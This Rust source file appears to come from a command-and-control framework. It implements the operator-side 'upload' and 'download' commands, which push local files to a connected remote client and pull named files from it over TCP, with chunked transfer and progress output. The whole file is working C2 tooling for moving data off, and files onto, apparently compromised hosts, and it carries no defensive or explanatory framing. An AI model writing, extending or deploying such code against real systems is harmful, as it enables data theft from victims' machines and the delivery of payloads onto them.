use crate::{
    c2_state::C2State,
    constants::{CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW},
};
use shared::{
    ClientMessage, FILE_CHUNK_SIZE, FileHeader, InstructMessage,
    utils::{get_flag_value, read_message, send_message},
};
use std::{
    fs,
    io::{Read, Write},
    net::TcpStream,
    path::Path,
};

fn print_progress_bar(read_bytes: u64, total_bytes: u64, process: &'static str) {
    let percent = if total_bytes == 0 {
        100.0
    } else {
        (read_bytes as f64 / total_bytes as f64) * 100.0
    };

    print!(
        "\r\t{DIM}[{RESET}{GREEN}{}{RESET}{DIM}]{RESET} \
         {CYAN}{:.2}%{RESET} {DIM}({}/{}){RESET}",
        process, percent, read_bytes, total_bytes
    );

    std::io::stdout().flush().ok();
}

pub fn upload(instruct: &[&str], conn: &mut TcpStream) -> Result<bool, String> {
    conn.write_all(instruct.join(" ").as_bytes())
        .map_err(|e| e.to_string())?;

    let filepath = match instruct.get(1..instruct.len()) {
        Some(raw) => raw.join(" "),
        None => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:upload{RESET}{DIM}]{RESET} {YELLOW}Path not specified{RESET}\n"
            );
            return Ok(true);
        }
    };

    // Check if file exists and is a file
    let filepath = Path::new(&filepath);
    let metadata = match filepath.metadata() {
        Ok(m) => m,
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:upload{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
    };

    if !metadata.is_file() {
        println!(
            "\n\t{DIM}[{RESET}{RED}err:upload{RESET}{DIM}]{RESET} {YELLOW}Path is not a file{RESET}\n"
        );
        return Ok(true);
    }

    let file_size = metadata.len();
    let filename = match filepath.file_name() {
        Some(name) => name.to_string_lossy().to_string(),
        None => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:upload{RESET}{DIM}]{RESET} {YELLOW}Error getting filename{RESET}\n"
            );
            return Ok(true);
        }
    };

    let msg = ClientMessage::FileHandler(FileHeader {
        name: filename.clone(),
        size: file_size,
    });
    match send_message(conn, &msg) {
        Ok(_) => (),
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:upload{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e.to_string()
            );
            return Ok(true);
        }
    }

    println!(
        "\n\t{DIM}[{RESET}{GREEN}upload{RESET}{DIM}]{RESET} {WHITE}{}{RESET} {DIM}({} bytes){RESET}\n",
        filename, file_size
    ); // Move value (filename) here cause we dont use it more

    // Read in chunks and send it
    let mut file_handle = match fs::File::open(filepath) {
        Ok(h) => h,
        Err(_) => {
            let _ = send_message(conn, &ClientMessage::Error("Can not open file".to_string()));
            return Ok(true);
        }
    };

    let mut read_bytes: u64 = 0;
    let mut last_printed: u64 = 0;
    let mut buf = [0u8; FILE_CHUNK_SIZE];

    while read_bytes < file_size {
        let bytes_read: usize = match file_handle.read(&mut buf) {
            Ok(b) => b,
            Err(_) => return Ok(true),
        };

        if bytes_read == 0 {
            break;
        }

        conn.write_all(&buf[..bytes_read])
            .map_err(|e| e.to_string())?;
        read_bytes += bytes_read as u64;

        if read_bytes - last_printed >= 256 * 1024 {
            print_progress_bar(read_bytes, file_size, "upload");
            last_printed = read_bytes;
        }
    }

    Ok(true)
}

pub fn download(instruct: &[&str], conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
    // Parse filename
    let instruct = instruct.join(" ");
    let args = shell_words::split(&instruct).map_err(|e| e.to_string())?;
    let filename = match get_flag_value(&args, "-f") {
        Some(f) => f,
        None => {
            println!(
                "\n\t{DIM}[{RESET}{RED}download{RESET}{DIM}]{RESET} {YELLOW}Missing filename.{RESET}\n\n\t\t{DIM}Usage:{RESET} {CYAN}download -f \"path/to/file\"{RESET}\n"
            );
            return Ok(true);
        }
    };

    // Send instruct
    let msg = InstructMessage::Download(filename);
    send_message(conn, &msg).map_err(|e| e.to_string())?;

    // Recive file size (or error)
    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;

    let fileheader: FileHeader = match msg {
        ClientMessage::FileHandler(header) => header,
        ClientMessage::Error(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:download{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
        _ => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:download{RESET}{DIM}]{RESET} {YELLOW}unknown error{RESET}\n"
            );
            return Ok(true);
        }
    };

    println!(
        "\n\t{DIM}[{RESET}{GREEN}download{RESET}{DIM}]{RESET} {WHITE}{}{RESET} {DIM}({} bytes){RESET}\n",
        fileheader.name, fileheader.size
    );

    let mut buf = [0u8; FILE_CHUNK_SIZE];
    let mut read_bytes: u64 = 0;
    let mut last_printed: u64 = 0;

    let path = format!("{}/{}", state.get_active_path(), &fileheader.name);
    let mut output = fs::File::create(path).map_err(|e| e.to_string())?;

    while read_bytes < fileheader.size {
        let bytes_read = match conn.read(&mut buf) {
            Ok(0) => {
                println!(
                    "\n\t{DIM}[{RESET}{RED}err:conn{RESET}{DIM}]{RESET} {YELLOW}client close conn{RESET}\n"
                );
                return Err("Client close connection".to_string());
            }

            Ok(b) => b,
            Err(err) => return Err(err.to_string()),
        };

        output
            .write_all(&buf[..bytes_read])
            .map_err(|e| e.to_string())?;
        read_bytes += bytes_read as u64;

        if read_bytes - last_printed >= 256 * 1024 {
            print_progress_bar(read_bytes, fileheader.size, "download");
            last_printed = read_bytes;
        }
    }

    Ok(true)
}
